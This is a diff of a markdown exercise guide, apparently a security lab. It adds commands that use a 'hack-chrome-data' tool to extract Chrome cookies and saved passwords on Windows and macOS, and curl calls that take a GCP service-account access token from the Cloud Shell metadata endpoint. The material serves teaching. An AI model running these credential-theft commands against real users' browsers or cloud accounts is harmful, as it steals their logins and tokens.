@@ -15,7 +15,7 @@
   - Other public cloud services
 
 ## Exercise's procedure
-### 1. Investigate Chrome's profile
+### 1. Investigate Chrome's profile (Local Device)
 #### Profile Path
 - Windows (Please use Windows side, not WSL)
   - `%HOMEPATH%\AppData\Local\Google\Chrome\User Data\<Your Profile Name>`
@@ -42,6 +42,28 @@ cd HackChromeData
 make build
 ```
 
+- For Windows
+  - (When your profile name is `Default`)
+```bash
+# Cookie
+hack-chrome-data.exe -kind cookie -targetpath "%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" -localstate "%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Local State"
+
+# Password
+hack-chrome-data.exe -kind logindata -targetpath "%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Default\Login Data" -localstate "%HOMEPATH%\AppData\Local\Google\Chrome\User Data\Local State"
+```
+
+- For macOS (Normal)
+  - (When your profile name is `Default`)
+  - this asks to access to keychain
+    - (`security find-generic-password -wa "Chrome"` is called internally)
+````bash
+# Cookie
+$ ./hack-chrome-data -kind cookie -targetpath ~/Library/Application\ Support/Google/Chrome/Default/Cookies
+
+# Password
+$ ./hack-chrome-data -kind logindata -targetpath ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data
+````
+
 - You can get Cookie and Password
   - without any additional authentication (Windows)
   - using user password (Mac)
@@ -62,6 +84,16 @@ $ file ~/.config/gcloud/credentials.db
 
 $ sqlite3 ~/.config/gcloud/credentials.db "select value from credentials;"
 ```
+
+- Caution: If you are on Cloud Shell, the credential is not stored on the terminal. You can access to the credential as follows
+```
+# Get Access Token
+$ curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+
+# See the token's information
+$ curl "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.c.b0AXv0zTODIOa_oxONq..."
+```
+
 - (Reference) https://book.hacktricks.xyz/cloud-security/gcp-security/gcp-persistance
 - (Reference) https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/#steal-gcloud-authorizations
 
